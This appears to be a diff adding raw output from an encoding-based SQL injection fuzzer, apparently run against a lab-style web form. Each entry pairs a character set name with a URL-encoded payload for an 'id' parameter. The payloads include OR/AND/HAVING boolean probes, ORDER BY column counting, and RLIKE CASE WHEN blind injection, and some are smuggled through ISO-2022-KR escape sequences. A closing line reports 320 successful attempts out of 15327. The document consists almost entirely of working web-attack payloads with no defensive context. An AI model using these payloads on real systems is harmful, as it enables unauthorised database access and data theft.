@@ -1,0 +1,961 @@
+[+] - ARABIC7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ASMO_449
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO18GREEK7OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO88GREEK7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO89ASMO449
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO150
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO150GREEKCCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO2022KR
+[+] - id=$'$)C%20%27OR%201%3D0%23'&Submit=Submit
+ -
+[+] - CSISO5427CYRILLIC
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK-CCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7-OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEKCCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-2022-KR
+[+] - id=$'$)C%20%27OR%201%3D0%23'&Submit=Submit
+ -
+[+] - ISO-IR-18
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-37
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-88
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-89
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-150
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO2022KR
+[+] - id=$'$)C%20%27OR%201%3D0%23'&Submit=Submit
+ -
+[+] - ISO_5427
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO_9036
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - KOI-7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ARABIC7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ASMO_449
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO18GREEK7OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO88GREEK7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO89ASMO449
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO150
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO150GREEKCCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO2022KR
+[+] - id=$'$)C%20%27HAVING%201%3D1%23'&Submit=Submit
+ -
+[+] - CSISO5427CYRILLIC
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK-CCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7-OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEKCCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-2022-KR
+[+] - id=$'$)C%20%27HAVING%201%3D1%23'&Submit=Submit
+ -
+[+] - ISO-IR-18
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-37
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-88
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-89
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-150
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO2022KR
+[+] - id=$'$)C%20%27HAVING%201%3D1%23'&Submit=Submit
+ -
+[+] - ISO_5427
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO_9036
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - KOI-7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ARABIC7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ASMO_449
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO18GREEK7OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO88GREEK7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO89ASMO449
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO150
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO150GREEKCCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO2022KR
+[+] - id=$'$)C%20%27HAVING%201%3D0%23'&Submit=Submit
+ -
+[+] - CSISO5427CYRILLIC
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK-CCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7-OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEKCCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-2022-KR
+[+] - id=$'$)C%20%27HAVING%201%3D0%23'&Submit=Submit
+ -
+[+] - ISO-IR-18
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-37
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-88
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-89
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-150
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO2022KR
+[+] - id=$'$)C%20%27HAVING%201%3D0%23'&Submit=Submit
+ -
+[+] - ISO_5427
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO_9036
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - KOI-7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ARABIC7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ASMO_449
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO18GREEK7OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO88GREEK7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO89ASMO449
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO150
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO150GREEKCCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO2022KR
+[+] - id=$'$)C%20%27AND%201%3D1%23'&Submit=Submit
+ -
+[+] - CSISO5427CYRILLIC
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK-CCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7-OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEKCCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-2022-KR
+[+] - id=$'$)C%20%27AND%201%3D1%23'&Submit=Submit
+ -
+[+] - ISO-IR-18
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-37
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-88
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-89
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-150
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO2022KR
+[+] - id=$'$)C%20%27AND%201%3D1%23'&Submit=Submit
+ -
+[+] - ISO_5427
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO_9036
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - KOI-7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ARABIC7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ASMO_449
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO18GREEK7OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO88GREEK7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO89ASMO449
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO150
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO150GREEKCCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO2022KR
+[+] - id=$'$)C%20%27AND%201%3D0%23'&Submit=Submit
+ -
+[+] - CSISO5427CYRILLIC
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK-CCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7-OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEKCCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-2022-KR
+[+] - id=$'$)C%20%27AND%201%3D0%23'&Submit=Submit
+ -
+[+] - ISO-IR-18
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-37
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-88
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-89
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-150
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO2022KR
+[+] - id=$'$)C%20%27AND%201%3D0%23'&Submit=Submit
+ -
+[+] - ISO_5427
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO_9036
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - KOI-7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ARABIC7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ASMO_449
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO18GREEK7OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO88GREEK7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO89ASMO449
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO150
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO150GREEKCCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO2022KR
+[+] - id=$'$)C%20%27AND%201%3D1%20AND%20%27%25%27%3D%27'&Submit=Submit
+ -
+[+] - CSISO5427CYRILLIC
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK-CCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7-OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEKCCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-2022-KR
+[+] - id=$'$)C%20%27AND%201%3D1%20AND%20%27%25%27%3D%27'&Submit=Submit
+ -
+[+] - ISO-IR-18
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-37
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-88
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-89
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-150
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO2022KR
+[+] - id=$'$)C%20%27AND%201%3D1%20AND%20%27%25%27%3D%27'&Submit=Submit
+ -
+[+] - ISO_5427
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO_9036
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - KOI-7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ARABIC7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ASMO_449
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO18GREEK7OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO88GREEK7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO89ASMO449
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO150
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO150GREEKCCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO2022KR
+[+] - id=$'$)C%20%27AND%201%3D0%20AND%20%27%25%27%3D%27'&Submit=Submit
+ -
+[+] - CSISO5427CYRILLIC
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK-CCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7-OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEKCCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-2022-KR
+[+] - id=$'$)C%20%27AND%201%3D0%20AND%20%27%25%27%3D%27'&Submit=Submit
+ -
+[+] - ISO-IR-18
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-37
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-88
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-89
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-150
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO2022KR
+[+] - id=$'$)C%20%27AND%201%3D0%20AND%20%27%25%27%3D%27'&Submit=Submit
+ -
+[+] - ISO_5427
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO_9036
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - KOI-7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ARABIC7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ASMO_449
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO18GREEK7OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO88GREEK7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO89ASMO449
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO150
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO150GREEKCCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO2022KR
+[+] - id=$'$)C%20%27AND%207300%3D7300%20AND%20%27pKlZ%27%3D%27pKlZ'&Submit=Submit
+ -
+[+] - CSISO5427CYRILLIC
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK-CCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7-OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEKCCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-2022-KR
+[+] - id=$'$)C%20%27AND%207300%3D7300%20AND%20%27pKlZ%27%3D%27pKlZ'&Submit=Submit
+ -
+[+] - ISO-IR-18
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-37
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-88
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-89
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-150
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO2022KR
+[+] - id=$'$)C%20%27AND%207300%3D7300%20AND%20%27pKlZ%27%3D%27pKlZ'&Submit=Submit
+ -
+[+] - ISO_5427
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO_9036
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - KOI-7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ARABIC7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ASMO_449
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO18GREEK7OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO88GREEK7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO89ASMO449
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO150
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO150GREEKCCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO2022KR
+[+] - id=$'$)C%20%27AND%207300%3D7300%20AND%20%27pKlZ%27%3D%27pKlY'&Submit=Submit
+ -
+[+] - CSISO5427CYRILLIC
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK-CCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7-OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEKCCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-2022-KR
+[+] - id=$'$)C%20%27AND%207300%3D7300%20AND%20%27pKlZ%27%3D%27pKlY'&Submit=Submit
+ -
+[+] - ISO-IR-18
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-37
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-88
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-89
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-150
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO2022KR
+[+] - id=$'$)C%20%27AND%207300%3D7300%20AND%20%27pKlZ%27%3D%27pKlY'&Submit=Submit
+ -
+[+] - ISO_5427
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO_9036
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - KOI-7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ARABIC7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ASMO_449
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO18GREEK7OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO88GREEK7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO89ASMO449
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO150
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO150GREEKCCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO2022KR
+[+] - id=$'$)C%20%27ORDER%20BY%201%23'&Submit=Submit
+ -
+[+] - CSISO5427CYRILLIC
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK-CCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7-OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEKCCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-2022-KR
+[+] - id=$'$)C%20%27ORDER%20BY%201%23'&Submit=Submit
+ -
+[+] - ISO-IR-18
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-37
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-88
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-89
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-150
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO2022KR
+[+] - id=$'$)C%20%27ORDER%20BY%201%23'&Submit=Submit
+ -
+[+] - ISO_5427
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO_9036
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - KOI-7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ARABIC7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ASMO_449
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO18GREEK7OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO88GREEK7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO89ASMO449
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO150
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO150GREEKCCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO2022KR
+[+] - id=$'$)C%20%27ORDER%20BY%202%23'&Submit=Submit
+ -
+[+] - CSISO5427CYRILLIC
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK-CCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7-OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEKCCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-2022-KR
+[+] - id=$'$)C%20%27ORDER%20BY%202%23'&Submit=Submit
+ -
+[+] - ISO-IR-18
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-37
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-88
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-89
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-150
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO2022KR
+[+] - id=$'$)C%20%27ORDER%20BY%202%23'&Submit=Submit
+ -
+[+] - ISO_5427
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO_9036
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - KOI-7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ARABIC7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ASMO_449
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO18GREEK7OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO19LATINGREEK
+[+] - id=%20%27RLIKE%20%28SELECT%20%28CASE%20WHEN%20%284346%3D4346%29%20THEN%200&Submit=Submit
+ -
+[+] - CSISO88GREEK7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO89ASMO449
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO150
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO150GREEKCCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO2022KR
+[+] - id=$'$)C%20%27RLIKE%20%28SELECT%20%28CASE%20WHEN%20%284346%3D4346%29%20THEN%200x61646d696e%20ELSE%200x28%20END%29%29%20AND%20%27Txws%27%3D%27'&Submit=Submit
+ -
+[+] - CSISO5427CYRILLIC
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK-CCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7-OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEKCCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-2022-KR
+[+] - id=$'$)C%20%27RLIKE%20%28SELECT%20%28CASE%20WHEN%20%284346%3D4346%29%20THEN%200x61646d696e%20ELSE%200x28%20END%29%29%20AND%20%27Txws%27%3D%27'&Submit=Submit
+ -
+[+] - ISO-IR-18
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-19
+[+] - id=%20%27RLIKE%20%28SELECT%20%28CASE%20WHEN%20%284346%3D4346%29%20THEN%200&Submit=Submit
+ -
+[+] - ISO-IR-37
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-88
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-89
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-150
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO2022KR
+[+] - id=$'$)C%20%27RLIKE%20%28SELECT%20%28CASE%20WHEN%20%284346%3D4346%29%20THEN%200x61646d696e%20ELSE%200x28%20END%29%29%20AND%20%27Txws%27%3D%27'&Submit=Submit
+ -
+[+] - ISO_5427
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO_9036
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - KOI-7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - LATIN-GREEK
+[+] - id=%20%27RLIKE%20%28SELECT%20%28CASE%20WHEN%20%284346%3D4346%29%20THEN%200&Submit=Submit
+ -
+[+] - LATINGREEK
+[+] - id=%20%27RLIKE%20%28SELECT%20%28CASE%20WHEN%20%284346%3D4346%29%20THEN%200&Submit=Submit
+ -
+[+] - ARABIC7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ASMO_449
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO18GREEK7OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO19LATINGREEK
+[+] - id=%20%27RLIKE%20%28SELECT%20%28CASE%20WHEN%20%284346%3D4347%29%20THEN%200&Submit=Submit
+ -
+[+] - CSISO88GREEK7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO89ASMO449
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO150
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO150GREEKCCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - CSISO2022KR
+[+] - id=$'$)C%20%27RLIKE%20%28SELECT%20%28CASE%20WHEN%20%284346%3D4347%29%20THEN%200x61646d696e%20ELSE%200x28%20END%29%29%20AND%20%27Txws%27%3D%27'&Submit=Submit
+ -
+[+] - CSISO5427CYRILLIC
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK-CCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7-OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEK7OLD
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - GREEKCCITT
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-2022-KR
+[+] - id=$'$)C%20%27RLIKE%20%28SELECT%20%28CASE%20WHEN%20%284346%3D4347%29%20THEN%200x61646d696e%20ELSE%200x28%20END%29%29%20AND%20%27Txws%27%3D%27'&Submit=Submit
+ -
+[+] - ISO-IR-18
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-19
+[+] - id=%20%27RLIKE%20%28SELECT%20%28CASE%20WHEN%20%284346%3D4347%29%20THEN%200&Submit=Submit
+ -
+[+] - ISO-IR-37
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-88
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-89
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO-IR-150
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO2022KR
+[+] - id=$'$)C%20%27RLIKE%20%28SELECT%20%28CASE%20WHEN%20%284346%3D4347%29%20THEN%200x61646d696e%20ELSE%200x28%20END%29%29%20AND%20%27Txws%27%3D%27'&Submit=Submit
+ -
+[+] - ISO_5427
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - ISO_9036
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - KOI-7
+[+] - id=%20%27&Submit=Submit
+ -
+[+] - LATIN-GREEK
+[+] - id=%20%27RLIKE%20%28SELECT%20%28CASE%20WHEN%20%284346%3D4347%29%20THEN%200&Submit=Submit
+ -
+[+] - LATINGREEK
+[+] - id=%20%27RLIKE%20%28SELECT%20%28CASE%20WHEN%20%284346%3D4347%29%20THEN%200&Submit=Submit
+ -
+[*] 320 out of 15327 worked
